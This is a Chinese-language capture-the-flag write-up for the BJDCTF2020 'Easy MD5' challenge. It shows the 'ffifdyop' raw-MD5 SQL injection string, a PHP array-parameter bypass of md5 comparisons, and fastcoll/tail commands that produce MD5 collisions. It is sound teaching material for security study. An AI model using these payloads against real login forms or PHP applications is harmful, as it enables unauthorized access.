# \[BJDCTF2020]Easy MD5

## \[BJDCTF2020]Easy MD5

## 考点

* MySQL的md5函数
* 数组绕过hash
* 使用fastcoll和tail进行hash碰撞

## wp

在返回头可以看到提示

![](https://i.loli.net/2020/08/05/qUg4fdGZs3DSoR5.jpg)

明显就是要绕sql语句了，在MySQL中md5(string,raw)解释如图\


![](https://i.loli.net/2020/08/05/b3TDxjIzlgFr59e.png)

可以看到，select \* from 'admin' where password=md5($pass,true) 这个语句中的 raw 为 True，即该函数返回 16 位原始二进制格式字符串

举个例子，假设输入的字符串为 x，t=md5(x)，y=md5(x,true)\
x='admin'，那么t='21232f297a57a5a743894a0e4a801fc3'，对t进行hex解码，就得到了 y='!#/)zW\xa5\xa7C\x89J\x0eJ\x80\x1f\xc3'

本题就是寻找一个字符串，让它的 y 包含 'or'\
这样执行的语句就是 select \* from 'admin' where password='...'or'...' 这样就绕过了该语句，通过爆破可以得到这个字符串，为 ffifdyop，当然不止一个，还有129581926211651571912466741651878684928

```
x : ffifdyop
t : 276f722736c95d99e921722cf9ed621c
y : 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
```

输入后跳转到新页面\
![](https://i.loli.net/2020/08/05/jby5fTX6PriFIMN.jpg)

在注释看到代码

```
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

很简单的一个绕过了，levels91.php?a\[]=1\&b\[]=2 再次跳转到新页面，又是一个简单的md5绕过，同样采取数组绕过\


![](https://i.loli.net/2020/08/05/t2GsRe4ZuWvwx9X.jpg)

当然，还有一种方案是使用 fastcoll 和 tail 可以解决这些问题

```
fastcoll_v1.0.0.5.exe -o test0.txt test1.txt     
//-o参数代表随机生成两个相同MD5的文件

fastcoll_v1.0.0.5.exe -p test1.txt -o test00.txt test01.txt
//-p参数代表根据test1.txt文件随机生成两个相同MD5的文件，注意：生成的MD5与test1.txt不同

tail.exe -c 128 test00.txt > a.txt               
//-c 128代表将test00.txt的最后128位写入文件a，这128位正是test1.txt与test00.txt的MD5不同的原因

tail.exe -c 128 test01.txt > b.txt
//同理

type test0.txt a.txt > test10.txt               //这里表示将test0.txt和a.txt文件的内容合并写入test10.txt
type test0.txt b.txt > test11.txt               //同理写入test11.txt
```

```php
<?php
function readmyfile($path){
	$fh = fopen($path, 'rb');
	$data = fread($fh, filesize($path));
	fclose($fh);
	return $data;
}

echo md5((readmyfile('1.txt')));
echo '</br>';
echo '</br>';
echo md5((readmyfile('2.txt')));

/* output

b4dd2a8a4dff1b0c9069a373ec2a62cd
b4dd2a8a4dff1b0c9069a373ec2a62cd

*/
```
